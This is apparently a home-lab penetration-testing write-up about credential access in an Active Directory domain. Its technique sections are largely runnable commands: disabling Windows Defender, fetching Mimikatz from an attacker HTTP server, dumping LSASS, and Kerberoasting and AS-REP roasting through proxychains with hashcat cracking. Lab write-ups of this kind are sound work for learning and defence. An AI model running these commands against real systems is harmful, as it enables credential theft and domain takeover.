# Credential Access — LSASS Dump, Kerberoasting, AS-REP Roasting

**ATT&CK Techniques:** T1003.001 · T1552.001 · T1558.003 · T1558.004

---

## Objective

Extract domain credentials from WIN11 and DC01 using four independent credential access techniques, ultimately obtaining jdoe's domain credentials as the springboard into the AD attack chain.

---

## Environment

| Property | Value |
|---|---|
| Target (credential dump) | WIN11 — 192.168.60.20 |
| Target (roasting) | DC01 — 192.168.56.10 |
| Starting position | labuser (local admin on WIN11) |
| Domain | lab.local |

---

## Tools Used

- Mimikatz
- Impacket (GetUserSPNs, GetNPUsers)
- Hashcat
- proxychains

---

## Technique 1: LSASS Credential Dump (T1003.001)

### Setup

Disabled Windows Defender before running Mimikatz:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Add-MpPreference -ExclusionPath "C:\Users\labuser\Desktop"
```

Downloaded Mimikatz from LNX HTTP server:
```powershell
curl http://192.168.60.10:8000/mimikatz.exe -o C:\Users\labuser\Desktop\mimikatz.exe
```

### Execution

```powershell
cd C:\Users\labuser\Desktop
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Output (relevant section)

```
Authentication Id : 0 ; XXXXXX
Session           : Interactive from 1
User Name         : jdoe
Domain            : LAB
Logon Server      : DC01

         * Username : jdoe
         * Domain   : LAB
         * NTLM     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
         * Password : Password123!
```

jdoe's cleartext password extracted from LSASS memory — cached from a previous interactive logon session on WIN11.

### Why this worked

`jdoe` authenticated interactively on WIN11 earlier (`runas /user:LAB\jdoe`). Windows caches credentials in LSASS for SSO purposes. With local admin + `privilege::debug`, Mimikatz can read the LSASS process memory directly.

---

## Technique 2: Credentials in Files (T1552.001)

A second independent path to jdoe's credentials — a plaintext config file readable by labuser:

```powershell
type C:\inetpub\wwwroot\config\db.config
```

**Output:**
```ini
[Database]
server=dc01.lab.local
username=jdoe
password=Password123!
domain=lab.local
```

jdoe's credentials confirmed via two independent techniques — LSASS dump and plaintext config file.

---

## Technique 3: Kerberoasting (T1558.003)

### Enumeration

Discovered `svc_sql` has an SPN set (Kerberoastable):
```powershell
Get-ADUser -Filter * -Properties ServicePrincipalNames |
  Where-Object {$_.ServicePrincipalNames} |
  Select Name, ServicePrincipalNames
```

**Output:**
```
svc_sql    {MSSQLSvc/dc01.lab.local:1433}
```

### Requesting the TGS Hash

From Kali through the pivot tunnel:
```bash
proxychains impacket-GetUserSPNs lab.local/jdoe:Password123! \
  -dc-ip 192.168.56.10 -request -outputfile /tmp/kerberoast.txt 2>/dev/null
```

TGS hash returned for `svc_sql` in hashcat format (`$krb5tgs$23$*`).

### Offline Cracking

```bash
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --force
```

**Result:** `svc_sql:Summer2024!`

### Why this worked

Any authenticated domain user can request a TGS for any account with an SPN. The ticket is encrypted with the service account's password hash — crackable offline with no lockout risk.

---

## Technique 4: AS-REP Roasting (T1558.004)

### Enumeration

Discovered `svc_backup` has pre-authentication disabled:
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select Name, SamAccountName
```

**Output:**
```
svc_backup    svc_backup
```

### Requesting the AS-REP Hash

```bash
proxychains impacket-GetNPUsers lab.local/jdoe:Password123! \
  -dc-ip 192.168.56.10 -request -outputfile /tmp/asrep.txt 2>/dev/null
```

AS-REP hash returned for `svc_backup` in hashcat format (`$krb5asrep$23$`).

### Offline Cracking

```bash
hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt --force
```

**Result:** `svc_backup:Backup2024!`

### Why this worked

With pre-authentication disabled, the KDC returns an AS-REP without verifying the client's identity first. The AS-REP is partially encrypted with the account's password hash — requestable without any credentials and crackable offline.

---

## ATT&CK Mapping

| Technique ID | Name | Description |
|---|---|---|
| T1003.001 | OS Credential Dumping: LSASS Memory | Mimikatz sekurlsa::logonpasswords extracted jdoe cleartext password from LSASS |
| T1552.001 | Credentials In Files | db.config at C:\inetpub\wwwroot\config contained jdoe:Password123! in plaintext |
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | TGS requested for svc_sql SPN, cracked offline to Summer2024! |
| T1558.004 | Steal or Forge Kerberos Tickets: AS-REP Roasting | AS-REP requested for svc_backup (pre-auth disabled), cracked offline to Backup2024! |

---

## Key Takeaways

- Two independent paths to the same credentials (LSASS + config file) is realistic — real environments frequently have credential redundancy that benefits attackers
- Kerberoasting and AS-REP roasting are entirely offline attacks after the initial hash request — no network noise during cracking, no lockout risk
- Service accounts with SPNs and weak passwords are among the most common and impactful AD findings in real engagements
- Mimikatz requires `privilege::debug` which needs SeDebugPrivilege — only available to local admins, reinforcing why local admin escalation matters before credential dumping
- Windows Defender flags Mimikatz immediately — Tamper Protection must be disabled via GUI before PowerShell can fully suppress AV
